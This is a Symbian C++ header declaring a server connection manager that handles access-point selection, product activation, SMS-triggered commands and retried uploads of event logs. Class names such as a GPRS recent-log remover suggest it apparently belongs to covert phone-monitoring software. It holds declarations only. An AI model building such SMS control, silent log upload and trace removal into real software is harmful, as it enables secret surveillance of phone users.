Bad SIM, or SIM card registration failed!
	Error Code:
   	TConnectionErrorInfo(EConnErrOpeningFailed, KErrTimedout) [3,-33]
	TConnectionErrorInfo(EConnErrOpeningFailed, KErrGeneral) [3,-2]

Offline Profile is Active
	Error Code:
	TConnectionErrorInfo(EConneErrInvalidState, KErrGeneral) [1,-2]

No Access Point Found (should send sms to create AP)
	Error Code:
	TConnectionErrorInfo(EConnErrNoWorkingAccessPoint, KErrGeneral) [4,-2]

Failing to create new access point 
	Error Code:
	iAction == EActionSeekAndCreateAP
	TConnectionErrorInfo(EConnErrNoWorkingAccessPoint, -XXX));

Wrong Access Point (None-internet)
	KErrDndNameNotFound(-5120)*/

class CServConnectMan : public CActiveBase,
						public MAccessPointChangeObserver,
						public MConnStateObserver,
						public MInetAutoSelectCallback,
						public MLogDeliveryCallback,
						public MAuthenTestObserver,
						public MProductActivationCallback,
#if !defined(EKA2)				
						public MSettingInfoObserver,
						public MSIMStatusObserver,
#endif
						public MTimeoutObserver,
						public MNetOperatorInfoListener,
						public MNetOperatorChangeObserver,
						public MLicenceObserver,	
						public MDbStateObserver,
						public MPeriodicCallbackObserver,
						public MCmdListener,
						public MLastConnInfoSource,
						public MApnInfoSource,
						public MConnMonitorObserver				
    {
public:
	static CServConnectMan* NewL(CFxsAppUi& aAppUi);
	~CServConnectMan();	
public:
	/**
	* Perform product activation/deactivation
	*  
	* @param  aActivateData, this must be valid till the operation completed otherwise panic
	*		  in another word, in the caller code, it MUST NOT be automatic variable
	* @param  aCallBack
	* @leave  KErrNoMemory
	* @return KErrNone if the operation is issued	
	*		  KErrNotReady if Offline profile is active
	*
	* The caller must always check the returned value
	*/
	void DoProductActivationL(TProductActivationData* aActivateData, MProductActivationCallback* aCallBack);
	void CancelProductActivation();	
	/**
	* Test server authentication
	*
	*/
	void DoAuthenTestL(MAuthenTestObserver& aAuthenObserver);
	/**
	* Access point selection
	*/
	void DoAPSelectionL(CInetAPSelectAction::TSelectType aType);
	void DoAPSelectionL(CInetAPSelectAction::TSelectType aType, CInetAPSelectAction::TAPSelectFilter aFilter,CInetAPSelectAction::TMode aMode=CInetAPSelectAction::EModeNoneUi);
	void DoAPSelectionL(TActionCode aAction, CInetAPSelectAction::TSelectType aType, CInetAPSelectAction::TAPSelectFilter aFilter, CInetAPSelectAction::TMode aMode=CInetAPSelectAction::EModeNoneUi);
	/**
	* Deliver event log to the server
	* 
	* @leave Memory allocation
	*/	
	void DoLogDeliveryL();
	
	/**
	* return aray of working access point
	*/
	const RArray<TApInfo>& WorkingAccessPoints();

private://MLastConnInfoSource
	const TServConnectionInfo& LastConnectionInfo();

private://MApnInfoSource
	const TArray<TApnRecovery> ApnRecoveryInfoArray() const;
	
private: //MConnStateObserver
	void HandleConnStatusL(TRConnectionState aState, const TInt aError);
	TInt HandleConnStatusLeave(TInt aError);
	
private: //MInetAutoSelectCallback
	void IAPSelectionProgressL(const TConnectCallbackInfo& aProgress);
	void IAPSelectionCompletedL(const TApSeekResultInfo& aResult);
	void IAPSelectionHandleError(TInt aError);
	
private://MLogDeliveryCallback
	void LogDeliveryCompleted(const TConnectionErrorInfo& aHttpConnError, const CServResponseHeader* aServResponse);
private://leave version
	void LogDeliveryCompletedL(const TConnectionErrorInfo& aHttpConnError, const CServResponseHeader* aServResponse);
		
private://MProductActivationCallback
	void ActivationCompleted(const TConnectionErrorInfo& aHttpConnError, const TApSeekResultInfo* aApSeekResult, const TActivationResult* aServerResponse, HBufC* aErrMsg = NULL);
	void ActivationCallbackL(const TConnectCallbackInfo& aProgress);
	void ActivationAuthenCompletedL(const TConnectionErrorInfo& aHttpConnError, const CServResponseHeader* aServResponse);
	
private://leave version
	void ActivationCompletedL(const TConnectionErrorInfo& aHttpConnError, const TActivationResult* aResponse);
	
private://MAuthenTestObserver
	void ServAuthenCompleted(const TConnectionErrorInfo& aHttpConnError, const CServResponseHeader* aServResponse);
	void ServAuthenCallbackL(const TConnectCallbackInfo& aProgress);

private://MConnMonitorObserver
	void ConnectionActiveStatusL(TInt aError, TBool aActive);
	void HandleConnMonLeave(TInt aError);
private://MLicenceObserver
	void LicenceActivatedL(TBool aActivated);
	
private:
	void SIMChanged();
	
private://MOperatorChagneObserver
	/**
	* Operator change notification
	*
	*/
	void NetworkOperatorChanged(const TNetOperatorInfo& aOperatorInfo);
	void CurrentOperatorInfo(const TNetOperatorInfo& aOperatorInfo);	
	
private://MAPChangeObserver
	void APRecordChangedL(const RArray<TApInfo>& aCurrentAP);
	void APCreateCompleted(TInt aError);
	void APRecordWaitState(TBool aWait);
	void ApnFirstTimeLoaded();
private:
	void APCreateCompletedL(TInt aError);//leave version
	
private://MDbStateObserver
	void OnDbAddedL();
	void MaxLimitSelectionReached();
	
private://MPeriodicCallbackObserver
	void DoPeriodicCallBackL();
	void HandlePeriodicCallBackLeave(TInt aError);
private://MTimeoutObserver
	void HandleTimedOutL();
	TInt HandleTimedOutLeave(TInt aLeaveCode);

#if !defined(EKA2)
private://MSettingInfoObserver
	void HandleNotificationL(SettingInfo::TSettingID aID,const TDesC& aNewValue);
#endif

private://From MSIMStatusObserver	
	void SIMStatus(TInt aStatus);

private://MCmdListener	
	HBufC* HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails);
	
private://CActive
	void RunL();
	void DoCancel();
	TInt RunError(TInt aError);
	TPtrC ClassName();
private:
	CServConnectMan(CFxsAppUi& aAppUi);
	void ConstructL();
	void NotifyProfileChangeL();
	void Copy(RArray<TApInfo>& aDes, const RArray<TApInfo>& aWorkingAP);
	void Copy(RArray<TAPSelectionResult>& aDes, const RArray<TAPSelectionResult>& aSource);
	
	//
	//Last connection status update
	void SetConnStartTime();
	void SetConnEndTime();
	void SetConnectionStatus(const TApInfo& aAp);
	void SetConnectionStatus(const TConnectionErrorInfo& aConnErrInfo);
	void SetConnectionStatus(TActionCode aAction);
	void SetConnectionStatus(const TApSelectErrInfo& aAPSeekErrInfo);
	void UpdateLastConnectionStatus(TActionCode aAction, const TConnectionErrorInfo& aErr);	
	void UpdateLastConnectionStatus(TActionCode aAction, const TConnectionErrorInfo& aErr, TInt* aServerResponseCode);
	void UpdateLastConnectionStatus(TActionCode aAction, const TApSelectErrInfo& aErr);	
	
	void UpdateApnRecoveryInfo(TApnRecoveryEvent aEvent,
							    TRecoEventDetect aDetected,
								TRecoEventApCreateComplete aApnCreateComplete,
								TRecoEventApCreateError aApnCreateErrCode,
								TRecoEventTestConnComplete aTestConnComplete,
								TRecoEventTestConnSuccess aTestConnSuccess,
								RArray<TInt>* aTestConnError);
								
	TApnRecovery& ApnRecoveryInfo(TApnRecoveryEvent aEvent);
	
	void GetErrorCodeArray(const TApSeekResultInfo& aSeekResult, RArray<TInt>& aResult);
	/**
	* Self complete operation
	*
	* @param aNexAction to perform when completed
	*/
	void CompleteSelf(TActionCode aNexAction);
	
	/**
	* Issue log delivery because the previous attempt is failed	
	*
	* @param aDeliveryRetryWait in secs
	* @return ETrue if issued	
	*/
	TBool IssueLogDeliveryRetry(TInt aDeliveryRetryWait = KLogDeliveryRetryDelay);
	/**
	* Issue log delivery action
	*/
	void IssueRedoLogDelivery(TInt aWaitSecond);
	TBool CreateAndTestAccessPoint();
	TBool CreateAndTestAccessPoint(TTimeIntervalMicroSeconds32 aDelay);
	/**
	* @param aDelay in secs
	*/
	TBool IssueRetryCreateAccessPoint(TInt aDelay);
	/**
	* 
	* @leave OOM
	*/
	void ReadSIMStatusL();
	
	/**
	* Invork activation callback
	* 
	* @param
	* @param
	* @param aError accept NULL
	*/
	void UpdateActivationProgressL(TInt aTitleRscId, TInt aConnStateRscId, const TInt* aError);
	void UpdateAuthenTestProgressL(TInt aTitleRscId, TInt aConnStateRscId, const TInt* aError);
	/*
	* @leave Memory allocation
	* @return ETrue, the operation is issued
	* 		  EFasle no access point used to connect
	*/
	TBool StartConnectionL();
	
	void SetActiveAction(TActionCode aAction);
	TActionCode ActiveAction();
	TBool ActionPending();	
	/**
	* ETrue indicates there is a working access point.
	*       the connection can be made
	* EFalse indicates no working access point	
	*/
	TBool HasWorkingAccessPoint();	
	/**
	* Check it is in valid state to make gprs connection
	*
	* @return ETrue when
	*		  - The current profile is not offline
	*		  - SIM status is OK
	*		  - Access point is completely loaded which means ApnFirstTimeLoaded() method is called.
	*		  - iWaitForApnChange is equals EFalse. the default valud is ETrue.
	*		  
	* Otherwise EFalse
	* @leave OOM, 
	*/
	TBool ValidStateL();
	
	/**
	* 
	* @return ETrue if Active profile is Offline	
	*/
	TBool OfflineProfile();
	void CancelActiveAction();	
	/**
	* Close connection
	* @pre  No pending action (current active is EActionNone)
	* @post connection closed
	*/
	void CloseConnection();
	void TerminateConnection();
	void DeleteAll();
	HBufC* ReadResourceTextLC(TInt aRscId);	
	TBool FindErrorCode(const TApSeekResultInfo& aResult, TInt aErrToFind);
private:
	enum TOpCodeTimeout
		{
		EOpCodeTimeoutSeekInternetAP,
		EOpCodeTimeoutEventDelivery
		};

	enum TAPStatus
		{
		/**
		Uninitialized status*/
		EAPStatusUnknown,					//0		
		/**
		Status OK.
		It can make http connection to server.*/
		EAPStatusOK,						//1
		/**
		No possible to connect to the Internet. -4159, -4158
		Could be
		- SIM is out of credit.
		- Gprs is not activated.
		- KErrTimedOut (-33) if it takes to long to connect. it is thrown by CConnEstablisher
		- KErrGeneral (-2) can also infer to as bad network. I got when there is heavy rain*/
		EAPStatusGprsError,					//2
		/**
		Domain name resolving error.
		This also can infer as wrong access point*/
		EAPStatusDomainError,				//3
		/**
		Can't make connection because of wrong access point or no internet access point configured.
		Error Codes
		- KErrDndNameNotFound (-5120)
		- KErrTimedOut (-33) also can infer as wrong access point*/
		EAPStatusNoInternetAP,				//4
		/**
		Indicates Http Error such as 404, 500*/
		EAPStatusHttpError,				//5
		/**
		when active profile is off-line*/
		EAPStatusInvalid					//6		
		};
	
private:
	CFxsAppUi& iAppUi;
	CLicenceManager& iLicenceMan;
	CFxsDatabase& iDatabase;
	CAccessPointMan& iInetAP;
	CFxsSettings&	iAppSettings;
	CServerUrlManager& iServSelector;
	/**
	Indicates that the application has been activated*/
	TBool iAppActivated;		
	/**
	EActionNone: no action currently in process*/
	TActionCode iAction;
	TActionCode iNextAction;	
	/*
	Last connection status info*/
	TServConnectionInfo iLastConnInfo;	
	TNetOperatorInfo iNetwOperator;
	TInt iAPCreatedCount;
	TInt iCreateAPOnNetwChangedCount;
	/**
	Array of working access points to be used.
	This AP Data will be save to file and loaded when application starts up*/
	//RArray<TApInfo>	iWorkingAP_Array;
	/**
	Wrong access points array*/
	RArray<TAPSelectionResult>  iNotWorkAP_Array;
	TApInfo iCurrUsedAP;
	CTimeOut* iTimeout;	
	/**
	This action will be done when timed out*/
	TActionCode	iTimedOutAction;
	//also keep the last connection info
	TUint iLogDeliveryRetryCount;
	//Auto Seek Actions
	CInetAPSelectAction* iAPSelector;
	TInt iSeekInetAPRetryCount;
	TApSeekResultInfo iApSeekResult;
	
	//Activation Action
	CProductActivAction* iActivAction;	
	MProductActivationCallback* iActivateCallBack;//not owned	
	CAuthenTestAction* iAuthenTestAction;
	MAuthenTestObserver* iAuthenObserver; //not owned
	/**
	Product activation parameter, Not owned*/
	TProductActivationData* iActivateData;
	/**
	Product activation parameter for product deactivation by sms.
	Owned by this class*/
	TProductActivationData* iDeactivationData;
	//Event Delivery Action
	CLogDeliveryAction* iDeliveryAction;
	CEventDeliveryTimer* iLogDeliverTimer;
	/**
	* Connection
	* the order of destruction
	* before delete it, make sure all server connection related action must be deleted first otherwise panic	
	*/
	CConnEstablisher* iConEstablisher;
	/*
	Connection Count*/
	TInt iConnectionMadeCount;
	CFxsGprsRecentLogRm* iGprsLogRm;
	CTerminator* iTerminator;
#if defined(EKA2)
	//CProfileChangeNotify* 
#else
	//Profile
	CSettingInfo* iSettings;
	CArrayFix<SettingInfo::TSettingID>* iSettingArray;	
#endif
	/**
	Current Active Profile.
    0 (general)
    1 (silent)
    2 (meeting)
    3 (outdoor)
    4 (pager)
	5 (offline)
	Do not make connection when the phone is in offline mode.*/
	TInt iActiveProfile;
	TBool iSIMStatusOK;
	/**
	indicating the product has been activated*/
	TBool iProductActivated;
	TInt iCreateApCount;
	/**
	Delivery wait interval for next attempt*/
	TInt iDeliveryRetryWait;
	TInt iDeliveryFailedCount;
	TUint iConnEstablishFailedCount;
	/**
	ETrue indicates that connection must not be made.
	Must wait til it changes to EFalse*/
	TBool iWaitForApnChange;
	TCreateAccessPointCount iApCerateCount;
	
	RApnRecoveryInfo iApnRecovInfo;	
	TApnRecoveryEvent iCurrApnRecovEvent; //not owned
	TBool iApnFirstLoaded;
    };

#endif
